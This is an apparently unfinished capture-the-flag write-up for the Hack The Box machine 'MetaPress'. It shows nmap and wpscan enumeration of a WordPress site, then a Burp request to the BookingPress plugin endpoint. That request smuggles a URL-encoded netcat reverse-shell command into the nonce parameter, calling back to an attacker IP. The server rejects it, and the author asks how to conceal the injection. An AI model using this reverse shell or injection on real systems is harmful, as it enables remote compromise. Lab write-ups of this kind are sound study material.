## Discovery
First things's first: we run NMAP. I like to use 
```
$ nmap -A 10.10.11.186
```
to get as much as info about the target machine as possible. 

We find there is a HTTP server on port 80. If you try to access it, you may find that the name cannot be resolved. In this case we need to tell Kali to resolve it locally by running:
```
$ sudo vim /etc/hosts
```
and simply adding the ip address and the name metapress.htb in the file like this:
```
127.0.0.1       localhost
127.0.1.1       kali

10.10.11.186    metapress.htb
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
```
NOTE: If you are inexperienced with ```vim```, its better to use ```nano``` in this case. 

** HERE EXPLAIN ABOUT GOING TO THE WEBSITE, ITS WORDPRESS, CLICKING AROUND IN THE WEBSITE, DIRBUSTER BUT TO NO AVAIL **

After a bit of research about the best hacking tools for WordPress I came accross a tool called ```wpscan``` . There are many tutorials but I referred to https://www.youtube.com/watch?v=Z9QPazbfwFE in order to learn the basics. So, after you register in http://wpscan.com and get your token, you can do some real enumeration. Run the following command (with your own wpscan API token):
```
wpscan --url metapress.htb --enumerate --api-token <API TOKEN>
```
A lot of useful information comes up. We are dealing with WP version 5.6.2. Another highlight of the scan:
```
[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://metapress.htb/wp-json/wp/v2/users/?per_page=100&page=1
 |  Rss Generator (Aggressive Detection)
 |  Author Sitemap (Aggressive Detection)
 |   - http://metapress.htb/wp-sitemap-users-1.xml
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
```
Now we know there is an author account. The output also contains info that this WP version is vulnerable and it lists a handful of vulnerabilities. The author part may come in handy but how do we choose from all of these vulnerabilities? At this point I was quite confused myself. So, I went on and inspected some of the traffic with ```burpsuite```. The main functionality of the website is making bookings for an event. At closer inspection, the metapress.htb/events/ page reveals that the "bookingpress-appointment-booking" plugin is used. It is quite confusing why the wpscan tool didn't find it. If you had a similar problem and know the solution, please do no shy away from sharing with me. 




when I send (via repeater in burpsuite):
```
POST /wp-admin/admin-ajax.php HTTP/1.1

Host: metapress.htb

Content-Length: 1098

Accept: application/json, text/plain, */*

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36

Content-Type: application/x-www-form-urlencoded

Origin: http://metapress.htb

Referer: http://metapress.htb/events/

Accept-Encoding: gzip, deflate

Accept-Language: en-US,en;q=0.9

Cookie: PHPSESSID=kfropsmmbk11sa8u4o510mdavh

Connection: close



action=bookingpress_before_book_appointment&appointment_data%5Bselected_category%5D=1&appointment_data%5Bselected_cat_name%5D=&appointment_data%5Bselected_service%5D=1

&appointment_data%5Bselected_service_name%5D=Startup%20meeting&appointment_data%5Bselected_service_price%5D=%240.00&appointment_data%5Bservice_price_without_currency%5D=0&appointment_data%5Bselected_date%5D=2022-12-06&appointment_data%5Bselected_start_time%5D=09%3A00&appointment_data%5Bselected_end_time%5D=09%3A30&appointment_data%5Bcustomer_name%5D=&appointment_data%5Bcustomer_firstname%5D=Lyuben&appointment_data%5Bcustomer_lastname%5D=Petrov&appointment_data%5Bcustomer_phone%5D=124124&appointment_data%5Bcustomer_email%5D=laina%40lainata.com&appointment_data%5Bappointment_note%5D=lailaina&appointment_data%5Bselected_payment_method%5D=&appointment_data%5Bcustomer_phone_country%5D=US&appointment_data%5Btotal_services%5D=&appointment_data%5Bstime%5D=1670376132&appointment_data%5Bspam_captcha%5D=4ENmLFaOTr5f&_wpnonce=3b7661e5b0;rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|sh%20-i%202>%261|nc%2010.10.14.198%201234%20>/tmp/f
```
where ```rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|sh%20-i%202>%261|nc%2010.10.14.198%201234%20>/tmp/f``` is the URL-encoded injection.

I get a response: 
```
{"variant":"error","title":"Error","msg":"Sorry, Your request can not process due to security reason.","redirect_url":""}
```
is "nonce" the vulnerable parameter? How do I conceal the injection?
